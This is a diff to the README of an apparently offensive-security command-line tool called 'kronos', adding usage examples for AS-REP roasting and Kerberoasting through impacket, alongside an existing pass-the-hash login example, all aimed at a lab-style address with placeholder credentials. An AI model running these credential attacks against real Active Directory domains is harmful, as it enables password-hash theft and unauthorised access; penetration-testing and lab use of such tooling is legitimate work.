@@ -70,4 +70,25 @@ kronos help
     kronos connect 10.10.10.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76'
     ```
 
+*   **`asrep-roast`**: Perform AS-REP roasting against a specific user using `impacket-GetNPUsers`.
+    ```bash
+    # Uses active tgt username and domain by default
+    kronos asrep-roast 10.10.10.10
+    
+    # Overriding the target username explicitly
+    kronos asrep-roast 10.10.10.10 -u 't.baker'
+    ```
+
+*   **`kerbroast`**: Perform Kerberoasting against the domain using `impacket-GetUserSPNs`.
+    ```bash
+    # Roast all users (uses active tgt credentials to authenticate)
+    kronos kerbroast 10.10.10.10
+    
+    # Roast a specific user only
+    kronos kerbroast 10.10.10.10 -t 't.baker'
+    
+    # Overriding the authentication credentials
+    kronos kerbroast 10.10.10.10 -u 'admin' -p 'Secret123!'
+    ```
+
 *(Run `kronos <command> --help` for specific options available to each command.)*
